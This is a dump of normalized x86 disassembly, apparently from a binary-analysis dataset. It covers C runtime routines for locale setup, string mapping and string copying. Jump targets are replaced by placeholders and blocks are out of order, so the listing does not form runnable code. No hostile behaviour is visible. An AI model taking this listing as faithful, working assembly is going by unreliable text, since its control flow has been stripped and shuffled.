call sub_40d7cc
push 0x16
pop edi
push esi
push esi
push esi
push esi
push esi
mov [ eax ] edi
call sub_40d749
add esp 0x14
mov eax edi
jmp r-xdata
push 0x4
push [ ebp + 0x8 ]
call edi
test eax eax
jne r-xdata
push r--data
call [ LoadLibraryA@IAT ]
mov [ ebp - 0x4 ] eax
cmp eax esi
jne r-xdata
pop edi
pop esi
leave
retn
xor eax eax
call sub_40d7cc
mov [ eax ] 0xc
call sub_40d7cc
mov eax [ eax ]
jmp r-xdata
push r--data
push eax
call [ GetProcAddress@IAT ]
mov edi eax
cmp edi esi
jne r-xdata
call sub_40d7cc
push 0x16
pop edi
push esi
push esi
push esi
push esi
push esi
mov [ eax ] edi
call sub_40d749
add esp 0x14
mov eax edi
jmp r-xdata
pop ebx
push edi
call sub_40e699
pop ecx
mov esi eax
call sub_40e70b
push esi
push rwxdata
mov ebx eax
call [ InterlockedExchange@IAT ]
cmp eax ebx
je r-xdata
call sub_40d7cc
mov edi [ GetLastError@IAT ]
mov ebx eax
call edi
push eax
call sub_40d78a
push esi
push esi
push esi
push esi
push esi
mov [ ebx ] eax
call sub_40d749
add esp 0x18
call edi
push eax
call sub_40d78a
pop ecx
jmp r-xdata
push [ ebp - 0x4 ]
call [ FreeLibrary@IAT ]
sub_419e73
mov edi edi
push ebp
mov ebp esp
sub esp 0x94
mov eax [ rwxdata ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push ebx
push esi
mov esi [ ebp + 0x18 ]
xor ebx ebx
cmp [ ebp + 0xc ] 0x1
push edi
mov [ ebp - 0x8c ] eax
mov [ ebp - 0x94 ] esi
jne r-xdata
cmp [ ebp + 0xc ] ebx
jne r-xdata
push ebx
push 0x80
lea edi [ ebp - 0x84 ]
mov ecx edi
push ecx
push [ ebp + 0x14 ]
mov [ ebp - 0x88 ] ebx
push [ ebp + 0x10 ]
push eax
call sub_427378
mov esi eax
add esp 0x18
cmp esi ebx
jne r-xdata
or eax 0xffffffff
push ebx
push 0x4
mov edi rwxdata
push edi
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push eax
call sub_427205
add esp 0x18
test eax eax
je r-xdata
push 0x1
push esi
call sub_41348c
pop ecx
pop ecx
mov ecx [ ebp - 0x94 ]
mov [ ecx ] eax
cmp eax ebx
jne r-xdata
call [ GetLastError@IAT ]
cmp eax 0x7a
jne r-xdata
mov [ esi ] bl
lea ecx [ esi - 0x1 ]
push ecx
push edi
push esi
push eax
call sub_41a1de
add esp 0x10
test eax eax
je r-xdata
cmp [ ebp - 0x88 ] ebx
je r-xdata
push ebx
push ebx
push ebx
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp - 0x8c ]
call sub_427378
add esp 0x18
mov [ ebp - 0x90 ] eax
cmp eax ebx
je r-xdata
xor eax eax
jmp r-xdata
mov al [ esi ]
mov cl 0xa
imul cl
add al bl
sub al 0x30
inc edi
inc edi
cmp edi rwxdata
mov [ esi ] al
jl r-xdata
cmp [ ebp - 0x88 ] ebx
je r-xdata
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_40d5e2
add esp 0x14
push edi
call sub_40fe78
pop ecx
xor esi esi
inc esi
push esi
push eax
call sub_41348c
mov edi eax
pop ecx
pop ecx
cmp edi ebx
je r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_40b762
leave
retn
mov bl [ edi ]
movzx eax bl
push eax
call sub_426d84
pop ecx
test eax eax
je r-xdata
jmp r-xdata
push edi
call sub_40fe78
pop ecx
push ebx
push [ ebp - 0x90 ]
mov [ ebp - 0x88 ] esi
push edi
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp - 0x8c ]
call sub_427378
mov esi eax
add esp 0x18
cmp esi ebx
je r-xdata
sub_41a001
mov edi edi
push ebp
mov ebp esp
sub esp 0x14
push ebx
push esi
push edi
call sub_40e70b
and [ ebp - 0x4 ] 0x0
cmp [ rwxdata ] 0x0
mov ebx eax
jne r-xdata
mov eax [ rwxdata ]
cmp eax ebx
je r-xdata
push r--data
call [ LoadLibraryA@IAT ]
mov edi eax
test edi edi
je r-xdata
mov eax [ rwxdata ]
cmp eax ebx
je r-xdata
cmp [ rwxdata ] ebx
je r-xdata
xor eax eax
mov esi [ GetProcAddress@IAT ]
push r--data
push edi
call esi
test eax eax
je r-xdata
push [ rwxdata ]
call sub_40e714
pop ecx
test eax eax
je r-xdata
push eax
call sub_40e714
pop ecx
test eax eax
je r-xdata
push eax
call sub_40e714
push [ rwxdata ]
mov esi eax
call sub_40e714
pop ecx
pop ecx
mov edi eax
test esi esi
je r-xdata
push eax
call sub_40e699
mov [ esp ] r--data
push edi
mov [ rwxdata ] eax
call esi
push eax
call sub_40e699
mov [ esp ] r--data
push edi
mov [ rwxdata ] eax
call esi
push eax
call sub_40e699
mov [ esp ] r--data
push edi
mov [ rwxdata ] eax
call esi
push eax
call sub_40e699
pop ecx
mov [ rwxdata ] eax
test eax eax
je r-xdata
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push [ ebp - 0x4 ]
call eax
jmp r-xdata
call eax
mov [ ebp - 0x4 ] eax
test eax eax
je r-xdata
test edi edi
je r-xdata
push r--data
push edi
call esi
push eax
call sub_40e699
pop ecx
mov [ rwxdata ] eax
pop edi
pop esi
pop ebx
leave
retn
mov eax [ rwxdata ]
cmp eax ebx
je r-xdata
call esi
test eax eax
je r-xdata
push eax
call sub_40e714
pop ecx
test eax eax
je r-xdata
or [ ebp + 0x10 ] 0x200000
jmp r-xdata
lea ecx [ ebp - 0x8 ]
push ecx
push 0xc
lea ecx [ ebp - 0x14 ]
push ecx
push 0x1
push eax
call edi
test eax eax
je r-xdata
push [ ebp - 0x4 ]
call eax
mov [ ebp - 0x4 ] eax
test [ ebp - 0xc ] 0x1
jne r-xdata
sub_41a16a
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push ebx
xor ebx ebx
push esi
push edi
cmp eax ebx
je r-xdata
call sub_40d7cc
push 0x16
pop esi
mov [ eax ] esi
mov edi [ ebp + 0xc ]
cmp edi ebx
ja r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
mov esi [ ebp + 0x10 ]
cmp esi ebx
jne r-xdata
mov edx eax
mov [ eax ] bl
jmp r-xdata
cmp edi ebx
je r-xdata
inc edx
dec edi
jne r-xdata
mov cl [ esi ]
mov [ edx ] cl
inc edx
inc esi
cmp cl bl
je r-xdata
cmp [ edx ] bl
je r-xdata
cmp edi ebx
jne r-xdata
dec edi
jne r-xdata
xor eax eax
mov [ eax ] bl
call sub_40d7cc
push 0x22
pop ecx
mov [ eax ] ecx
mov esi ecx
jmp r-xdata
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_40d749
add esp 0x14
mov eax esi
jmp r-xdata
sub_41a1de
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
mov esi [ ebp + 0x8 ]
xor ebx ebx
push edi
cmp [ ebp + 0x14 ] ebx
jne r-xdata
cmp esi ebx
je r-xdata
cmp esi ebx
jne r-xdata
call sub_40d7cc
push 0x16
pop esi
mov [ eax ] esi
mov edi [ ebp + 0xc ]
cmp edi ebx
ja r-xdata
cmp [ ebp + 0xc ] ebx
jne r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
cmp [ ebp + 0x14 ] ebx
jne r-xdata
xor eax eax
mov edx [ ebp + 0x10 ]
cmp edx ebx
jne r-xdata
mov [ esi ] bl
jmp r-xdata
cmp [ ebp + 0x14 ] 0xffffffff
mov eax esi
jne r-xdata
mov [ esi ] bl
jmp r-xdata
mov cl [ edx ]
mov [ eax ] cl
inc eax
inc edx
cmp cl bl
je r-xdata
mov cl [ edx ]
mov [ eax ] cl
inc eax
inc edx
cmp cl bl
je r-xdata
cmp [ ebp + 0x14 ] ebx
jne r-xdata
dec edi
je r-xdata
cmp edi ebx
jne r-xdata
dec edi
jne r-xdata
mov [ eax ] bl
dec [ ebp + 0x14 ]
jne r-xdata
cmp [ ebp + 0x14 ] 0xffffffff
jne r-xdata
jmp r-xdata
mov [ esi ] bl
call sub_40d7cc
push 0x22
pop ecx
mov [ eax ] ecx
mov esi ecx
jmp r-xdata
mov eax [ ebp + 0xc ]
push 0x50
mov [ esi + eax - 0x1 ] bl
pop eax
jmp r-xdata
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_40d749
add esp 0x14
mov eax esi
jmp r-xdata
sub_41a293
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
push esi
xor esi esi
cmp ecx esi
jl r-xdata
call sub_40d7cc
push esi
push esi
push esi
push esi
push esi
mov [ eax ] 0x16
call sub_40d749
add esp 0x14
or eax 0xffffffff
cmp ecx 0x2
jle r-xdata
mov eax [ rwxdata ]
mov [ rwxdata ] ecx
jmp r-xdata
cmp ecx 0x3
jne r-xdata
pop esi
pop ebp
retn
mov eax [ rwxdata ]
jmp r-xdata
sub_41a2f3
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x10 ]
call sub_40c8c3
movzx eax [ ebp + 0xc ]
mov ecx [ ebp - 0xc ]
mov dl [ ebp + 0x14 ]
test [ ecx + eax + 0x1d ] dl
jne r-xdata
xor eax eax
inc eax
cmp [ ebp + 0x10 ] 0x0
je r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
xor eax eax
mov ecx [ ebp - 0x10 ]
mov ecx [ ecx + 0xc8 ]
movzx eax [ ecx + eax * 2 ]
and eax [ ebp + 0x10 ]
jmp r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
test eax eax
je r-xdata
sub_41a548
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0xc ]
lea ecx [ ebp - 0x10 ]
call sub_40c8c3
mov eax [ ebp - 0xc ]
test eax eax
je r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
cmp [ eax + 0x4 ] 0x3a4
jne r-xdata
xor eax eax
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
push 0x3
push 0x0
push [ ebp + 0x8 ]
push [ ebp + 0xc ]
call sub_41a2f3
add esp 0x10
cmp [ ebp - 0x4 ] 0x0
je r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
leave
retn
sub_41a5c6
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
test eax eax
je r-xdata
pop ebp
retn
sub eax 0x8
cmp [ eax ] 0xdddd
jne r-xdata
push eax
call sub_40fe78
pop ecx
sub_41a5e6
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
jmp r-xdata
test ecx ecx
jne r-xdata
dec ecx
cmp [ eax ] 0x0
je r-xdata
dec ecx
mov eax [ ebp + 0x8 ]
sub eax ecx
dec eax
pop ebp
retn
inc eax
sub_41a604
mov edi edi
push ebp
mov ebp esp
sub esp 0x14
mov eax [ rwxdata ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
xor ebx ebx
push edi
mov esi ecx
cmp [ rwxdata ] ebx
jne r-xdata
cmp [ ebp + 0x14 ] ebx
jle r-xdata
push ebx
push ebx
xor edi edi
inc edi
push edi
push r--data
push 0x100
push ebx
call [ LCMapStringW@IAT ]
test eax eax
je r-xdata
mov eax [ rwxdata ]
cmp eax 0x2
je r-xdata
mov ecx [ ebp + 0x14 ]
mov eax [ ebp + 0x10 ]
call [ GetLastError@IAT ]
cmp eax 0x78
jne r-xdata
mov [ rwxdata ] edi
jmp r-xdata
mov [ ebp - 0xc ] ebx
mov [ ebp - 0x10 ] ebx
cmp [ ebp + 0x8 ] ebx
jne r-xdata
cmp eax ebx
je r-xdata
mov eax [ ebp + 0x14 ]
sub eax ecx
dec eax
cmp eax [ ebp + 0x14 ]
jge r-xdata
inc eax
cmp ecx ebx
jne r-xdata
mov [ rwxdata ] 0x2
cmp [ ebp + 0x20 ] ebx
jne r-xdata
mov eax [ esi ]
mov eax [ eax + 0x14 ]
mov [ ebp + 0x8 ] eax
cmp eax 0x1
jne r-xdata
mov [ ebp + 0x14 ] eax
inc eax
dec ecx
cmp [ eax ] bl
je r-xdata
or ecx 0xffffffff
push [ ebp + 0x8 ]
call sub_4273b5
pop ecx
mov [ ebp - 0x14 ] eax
cmp eax 0xffffffff
jne r-xdata
mov eax [ esi ]
mov eax [ eax + 0x4 ]
mov [ ebp + 0x20 ] eax
xor eax eax
jmp r-xdata
mov [ ebp - 0x8 ] ebx
cmp [ ebp + 0x20 ] ebx
jne r-xdata
cmp eax [ ebp + 0x20 ]
je r-xdata
lea esp [ ebp - 0x20 ]
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_40b762
leave
retn
mov esi [ MultiByteToWideChar@IAT ]
xor eax eax
cmp [ ebp + 0x24 ] ebx
push ebx
push ebx
push [ ebp + 0x14 ]
setne al
push [ ebp + 0x10 ]
lea eax [ eax * 8 + 0x1 ]
push eax
push [ ebp + 0x20 ]
call esi
mov edi eax
cmp edi ebx
je r-xdata
mov eax [ esi ]
mov eax [ eax + 0x4 ]
mov [ ebp + 0x20 ] eax
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ LCMapStringA@IAT ]
mov esi eax
push ebx
push ebx
lea ecx [ ebp + 0x14 ]
push ecx
push [ ebp + 0x10 ]
push eax
push [ ebp + 0x20 ]
call sub_4273fe
add esp 0x18
mov [ ebp - 0xc ] eax
cmp eax ebx
je r-xdata
jle r-xdata
mov eax [ ebp - 0x10 ]
cmp eax ebx
je r-xdata
push [ ebp - 0xc ]
call sub_40fe78
pop ecx
mov esi [ LCMapStringA@IAT ]
push ebx
push ebx
push [ ebp + 0x14 ]
push eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call esi
mov [ ebp - 0x8 ] eax
cmp eax ebx
jne r-xdata
mov [ ebp - 0xc ] ebx
push 0xffffffe0
xor edx edx
pop eax
div edi
cmp eax 0x2
jb r-xdata
mov eax esi
cmp [ ebp + 0x18 ] eax
je r-xdata
jle r-xdata
xor esi esi
jmp r-xdata
push edi
push [ ebp - 0xc ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push 0x1
push [ ebp + 0x20 ]
call esi
test eax eax
je r-xdata
lea eax [ edi + edi + 0x8 ]
cmp eax 0x400
ja r-xdata
push eax
call sub_40fe78
pop ecx
xor edi edi
cmp eax 0xffffffe0
ja r-xdata
cmp [ ebp - 0xc ] ebx
je r-xdata
push [ ebp - 0xc ]
call sub_41a5c6
mov eax [ ebp - 0x8 ]
pop ecx
jmp r-xdata
mov esi [ LCMapStringW@IAT ]
push ebx
push ebx
push edi
push [ ebp - 0xc ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call esi
mov ecx eax
mov [ ebp - 0x8 ] ecx
cmp ecx ebx
je r-xdata
push eax
call sub_4107e9
pop ecx
cmp eax ebx
je r-xdata
call sub_4275c0
mov eax esp
cmp eax ebx
je r-xdata
push [ ebp - 0x8 ]
push ebx
push edi
call sub_413d20
add esp 0xc
push [ ebp - 0x8 ]
push edi
push [ ebp + 0x14 ]
push [ ebp - 0xc ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call esi
mov [ ebp - 0x8 ] eax
cmp eax ebx
jne r-xdata
add eax 0x8
cmp eax 0x400
ja r-xdata
test [ ebp + 0xc ] 0x400
je r-xdata
mov [ ebp - 0xc ] eax
jmp r-xdata
mov [ eax ] 0xdddd
mov [ eax ] 0xcccc
jmp r-xdata
push [ ebp + 0x1c ]
lea eax [ ebp - 0x8 ]
push [ ebp + 0x18 ]
push eax
push edi
push [ ebp + 0x20 ]
push [ ebp - 0x14 ]
call sub_4273fe
mov esi eax
mov [ ebp - 0x10 ] esi
add esp 0x18
neg esi
sbb esi esi
and esi [ ebp - 0x8 ]
xor esi esi
jmp r-xdata
push eax
call sub_4107e9
pop ecx
cmp eax ebx
je r-xdata
call sub_4275c0
mov edi esp
cmp edi ebx
je r-xdata
cmp ecx ebx
jle r-xdata
cmp [ ebp + 0x1c ] ebx
je r-xdata
cmp [ ebp - 0xc ] ebx
je r-xdata
add eax 0x8
push edi
call sub_41a5c6
pop ecx
jmp r-xdata
mov edi eax
jmp r-xdata
mov [ eax ] 0xdddd
add eax 0x8
mov [ edi ] 0xcccc
add edi 0x8
jmp r-xdata
xor esi esi
push 0xffffffe0
xor edx edx
pop eax
div ecx
cmp eax 0x2
jb r-xdata
cmp ecx [ ebp + 0x1c ]
jg r-xdata
cmp edi ebx
je r-xdata
push [ ebp - 0x8 ]
push esi
push edi
push [ ebp - 0xc ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ LCMapStringW@IAT ]
test eax eax
je r-xdata
lea eax [ ecx + ecx + 0x8 ]
cmp eax 0x400
ja r-xdata
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push edi
push [ ebp - 0xc ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call esi
jmp r-xdata
push esi
call sub_41a5c6
pop ecx
push ebx
push ebx
cmp [ ebp + 0x1c ] ebx
jne r-xdata
push eax
call sub_4107e9
pop ecx
cmp eax ebx
je r-xdata
call sub_4275c0
mov esi esp
cmp esi ebx
je r-xdata
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push ebx
push ebx
jmp r-xdata
mov esi eax
jmp r-xdata
mov [ eax ] 0xdddd
add eax 0x8
mov [ esi ] 0xcccc
add esi 0x8
jmp r-xdata
push [ ebp - 0x8 ]
push esi
push ebx
push [ ebp + 0x20 ]
call [ WideCharToMultiByte@IAT ]
mov [ ebp - 0x8 ] eax
cmp esi ebx
je r-xdata
sub_41a9a9
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x10 ]
call sub_40c8c3
push [ ebp + 0x28 ]
lea ecx [ ebp - 0x10 ]
push [ ebp + 0x24 ]
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call sub_41a604
add esp 0x20
cmp [ ebp - 0x4 ] 0x0
je r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
sub_41a9ee
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
mov eax [ rwxdata ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ rwxdata ]
push ebx
push esi
xor ebx ebx
push edi
mov edi ecx
cmp eax ebx
jne r-xdata
cmp eax 0x2
je r-xdata
lea eax [ ebp - 0x8 ]
push eax
xor esi esi
inc esi
push esi
push r--data
push esi
call [ GetStringTypeW@IAT ]
test eax eax
je r-xdata
xor esi esi
cmp [ ebp + 0x1c ] ebx
jne r-xdata
cmp eax ebx
je r-xdata
call [ GetLastError@IAT ]
cmp eax 0x78
jne r-xdata
mov [ rwxdata ] esi
jmp r-xdata
cmp [ ebp + 0x18 ] ebx
jne r-xdata
mov eax [ edi ]
mov eax [ eax + 0x14 ]
mov [ ebp + 0x1c ] eax
cmp eax 0x1
jne r-xdata
mov eax [ rwxdata ]
push 0x2
pop eax
mov [ rwxdata ] eax
jmp r-xdata
mov [ ebp - 0x8 ] ebx
cmp [ ebp + 0x18 ] ebx
jne r-xdata
push [ ebp + 0x1c ]
call sub_4273b5
pop ecx
cmp eax 0xffffffff
jne r-xdata
mov eax [ edi ]
mov eax [ eax + 0x4 ]
mov [ ebp + 0x18 ] eax
xor eax eax
jmp r-xdata
mov esi [ MultiByteToWideChar@IAT ]
xor eax eax
cmp [ ebp + 0x20 ] ebx
push ebx
push ebx
push [ ebp + 0x10 ]
setne al
push [ ebp + 0xc ]
lea eax [ eax * 8 + 0x1 ]
push eax
push [ ebp + 0x18 ]
call esi
mov edi eax
cmp edi ebx
je r-xdata
mov eax [ edi ]
mov eax [ eax + 0x4 ]
mov [ ebp + 0x18 ] eax
cmp eax [ ebp + 0x18 ]
je r-xdata
lea esp [ ebp - 0x14 ]
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_40b762
leave
retn
jle r-xdata
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push [ ebp + 0x1c ]
call [ GetStringTypeA@IAT ]
mov edi eax
cmp esi ebx
je r-xdata
push ebx
push ebx
lea ecx [ ebp + 0x10 ]
push ecx
push [ ebp + 0xc ]
push eax
push [ ebp + 0x18 ]
call sub_4273fe
mov esi eax
add esp 0x18
cmp esi ebx
je r-xdata
test ebx ebx
je r-xdata
cmp edi 0x7ffffff0
ja r-xdata
mov eax edi
push esi
call sub_40fe78
pop ecx
mov [ ebp + 0xc ] esi
lea eax [ edi + edi ]
push eax
push 0x0
push ebx
call sub_413d20
add esp 0xc
push edi
push ebx
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push 0x1
push [ ebp + 0x18 ]
call esi
test eax eax
je r-xdata
lea eax [ edi + edi + 0x8 ]
cmp eax 0x400
ja r-xdata
push ebx
call sub_41a5c6
mov eax [ ebp - 0x8 ]
pop ecx
jmp r-xdata
push [ ebp + 0x14 ]
push eax
push ebx
push [ ebp + 0x8 ]
call [ GetStringTypeW@IAT ]
mov [ ebp - 0x8 ] eax
push eax
call sub_4107e9
pop ecx
cmp eax ebx
je r-xdata
call sub_4275c0
mov eax esp
cmp eax ebx
je r-xdata
mov ebx eax
mov [ eax ] 0xdddd
mov [ eax ] 0xcccc
jmp r-xdata
add eax 0x8
sub_41aba8
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x10 ]
call sub_40c8c3
push [ ebp + 0x24 ]
lea ecx [ ebp - 0x10 ]
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call sub_41a9ee
add esp 0x1c
cmp [ ebp - 0x4 ] 0x0
je r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
sub_41ac19
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
movzx ecx [ eax + 0x42 ]
movzx edx [ eax + 0x44 ]
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0x8 ] edx
test esi esi
jne r-xdata
and [ ebp - 0xc ] 0x0
push ebx
push edi
mov [ ebp - 0x10 ] eax
lea eax [ esi + 0x4 ]
push eax
push 0x31
push ecx
xor ebx ebx
inc ebx
lea eax [ ebp - 0x10 ]
push ebx
push eax
call sub_419e73
mov edi eax
lea eax [ esi + 0x8 ]
push eax
push 0x32
push [ ebp - 0x4 ]
lea eax [ ebp - 0x10 ]
push ebx
push eax
call sub_419e73
or edi eax
lea eax [ esi + 0xc ]
push eax
push 0x33
push [ ebp - 0x4 ]
lea eax [ ebp - 0x10 ]
push ebx
push eax
call sub_419e73
or edi eax
lea eax [ esi + 0x10 ]
push eax
push 0x34
push [ ebp - 0x4 ]
lea eax [ ebp - 0x10 ]
push ebx
push eax
call sub_419e73
add esp 0x50
or edi eax
lea eax [ esi + 0x14 ]
push eax
push 0x35
push [ ebp - 0x4 ]
lea eax [ ebp - 0x10 ]
push ebx
push eax
call sub_419e73
or edi eax
lea eax [ esi + 0x18 ]
push eax
push 0x36
push [ ebp - 0x4 ]
lea eax [ ebp - 0x10 ]
push ebx
push eax
call sub_419e73
push esi
push 0x37
push [ ebp - 0x4 ]
or edi eax
lea eax [ ebp - 0x10 ]
push ebx
push eax
call sub_419e73
or edi eax
lea eax [ esi + 0x20 ]
push eax
push 0x2a
push [ ebp - 0x4 ]
lea eax [ ebp - 0x10 ]
push ebx
push eax
call sub_419e73
add esp 0x50
or edi eax
lea eax [ esi + 0x24 ]
push eax
push 0x2b
push [ ebp - 0x4 ]
lea eax [ ebp - 0x10 ]
push ebx
push eax
call sub_419e73
or edi eax
lea eax [ esi + 0x28 ]
push eax
push 0x2c
push [ ebp - 0x4 ]
lea eax [ ebp - 0x10 ]
push ebx
push eax
call sub_419e73
or edi eax
lea eax [ esi + 0x2c ]
push eax
push 0x2d
push [ ebp - 0x4 ]
lea eax [ ebp - 0x10 ]
push ebx
push eax
call sub_419e73
or edi eax
lea eax [ esi + 0x30 ]
push eax
push 0x2e
push [ ebp - 0x4 ]
lea eax [ ebp - 0x10 ]
push ebx
push eax
call sub_419e73
add esp 0x50
or edi eax
lea eax [ esi + 0x34 ]
push eax
push 0x2f
push [ ebp - 0x4 ]
lea eax [ ebp - 0x10 ]
push ebx
push eax
call sub_419e73
or edi eax
lea eax [ esi + 0x1c ]
push eax
push 0x30
push [ ebp - 0x4 ]
lea eax [ ebp - 0x10 ]
push ebx
push eax
call sub_419e73
or edi eax
lea eax [ esi + 0x38 ]
push eax
push 0x44
push [ ebp - 0x4 ]
lea eax [ ebp - 0x10 ]
push ebx
push eax
call sub_419e73
or edi eax
lea eax [ esi + 0x3c ]
push eax
push 0x45
push [ ebp - 0x4 ]
lea eax [ ebp - 0x10 ]
push ebx
push eax
call sub_419e73
add esp 0x50
or edi eax
lea eax [ esi + 0x40 ]
push eax
push 0x46
push [ ebp - 0x4 ]
lea eax [ ebp - 0x10 ]
push ebx
push eax
call sub_419e73
or edi eax
lea eax [ esi + 0x44 ]
push eax
push 0x47
push [ ebp - 0x4 ]
lea eax [ ebp - 0x10 ]
push ebx
push eax
call sub_419e73
or edi eax
lea eax [ esi + 0x48 ]
push eax
push 0x48
push [ ebp - 0x4 ]
lea eax [ ebp - 0x10 ]
push ebx
push eax
call sub_419e73
or edi eax
lea eax [ esi + 0x4c ]
push eax
push 0x49
push [ ebp - 0x4 ]
lea eax [ ebp - 0x10 ]
push ebx
push eax
call sub_419e73
add esp 0x50
or edi eax
lea eax [ esi + 0x50 ]
push eax
push 0x4a
push [ ebp - 0x4 ]
lea eax [ ebp - 0x10 ]
push ebx
push eax
call sub_419e73
or edi eax
lea eax [ esi + 0x54 ]
push eax
push 0x4b
push [ ebp - 0x4 ]
lea eax [ ebp - 0x10 ]
push ebx
push eax
call sub_419e73
or edi eax
lea eax [ esi + 0x58 ]
push eax
push 0x4c
push [ ebp - 0x4 ]
lea eax [ ebp - 0x10 ]
push ebx
push eax
call sub_419e73
or edi eax
lea eax [ esi + 0x5c ]
push eax
push 0x4d
push [ ebp - 0x4 ]
lea eax [ ebp - 0x10 ]
push ebx
push eax
call sub_419e73
add esp 0x50
or edi eax
lea eax [ esi + 0x60 ]
push eax
push 0x4e
push [ ebp - 0x4 ]
lea eax [ ebp - 0x10 ]
push ebx
push eax
call sub_419e73
or edi eax
lea eax [ esi + 0x64 ]
push eax
push 0x4f
push [ ebp - 0x4 ]
lea eax [ ebp - 0x10 ]
push ebx
push eax
call sub_419e73
or edi eax
lea eax [ esi + 0x68 ]
push eax
push 0x38
push [ ebp - 0x4 ]
lea eax [ ebp - 0x10 ]
push ebx
push eax
call sub_419e73
or edi eax
lea eax [ esi + 0x6c ]
push eax
push 0x39
push [ ebp - 0x4 ]
lea eax [ ebp - 0x10 ]
push ebx
push eax
call sub_419e73
add esp 0x50
or edi eax
lea eax [ esi + 0x70 ]
push eax
push 0x3a
push [ ebp - 0x4 ]
lea eax [ ebp - 0x10 ]
push ebx
push eax
call sub_419e73
or edi eax
lea eax [ esi + 0x74 ]
push eax
push 0x3b
push [ ebp - 0x4 ]
lea eax [ ebp - 0x10 ]
push ebx
push eax
call sub_419e73
or edi eax
lea eax [ esi + 0x78 ]
push eax
push 0x3c
push [ ebp - 0x4 ]
lea eax [ ebp - 0x10 ]
push ebx
push eax
call sub_419e73
or edi eax
lea eax [ esi + 0x7c ]
push eax
push 0x3d
push [ ebp - 0x4 ]
lea eax [ ebp - 0x10 ]
push ebx
push eax
call sub_419e73
add esp 0x50
or edi eax
lea eax [ esi + 0x80 ]
push eax
push 0x3e
push [ ebp - 0x4 ]
lea eax [ ebp - 0x10 ]
push ebx
push eax
call sub_419e73
or edi eax
lea eax [ esi + 0x84 ]
push eax
push 0x3f
push [ ebp - 0x4 ]
lea eax [ ebp - 0x10 ]
push ebx
push eax
call sub_419e73
or edi eax
lea eax [ esi + 0x88 ]
push eax
push 0x40
push [ ebp - 0x4 ]
push ebx
lea eax [ ebp - 0x10 ]
push eax
call sub_419e73
or edi eax
lea eax [ esi + 0x8c ]
push eax
push 0x41
push [ ebp - 0x4 ]
lea eax [ ebp - 0x10 ]
push ebx
push eax
call sub_419e73
add esp 0x50
or edi eax
lea eax [ esi + 0x90 ]
push eax
push 0x42
push [ ebp - 0x4 ]
lea eax [ ebp - 0x10 ]
push ebx
push eax
call sub_419e73
or edi eax
lea eax [ esi + 0x94 ]
push eax
push 0x43
push [ ebp - 0x4 ]
lea eax [ ebp - 0x10 ]
push ebx
push eax
call sub_419e73
or edi eax
lea eax [ esi + 0x98 ]
push eax
push 0x28
push [ ebp - 0x4 ]
lea eax [ ebp - 0x10 ]
push ebx
push eax
call sub_419e73
or edi eax
lea eax [ esi + 0x9c ]
push eax
push 0x29
push [ ebp - 0x4 ]
lea eax [ ebp - 0x10 ]
push ebx
push eax
call sub_419e73
add esp 0x50
or edi eax
lea eax [ esi + 0xa0 ]
push eax
push 0x1f
push [ ebp - 0x8 ]
lea eax [ ebp - 0x10 ]
push ebx
push eax
call sub_419e73
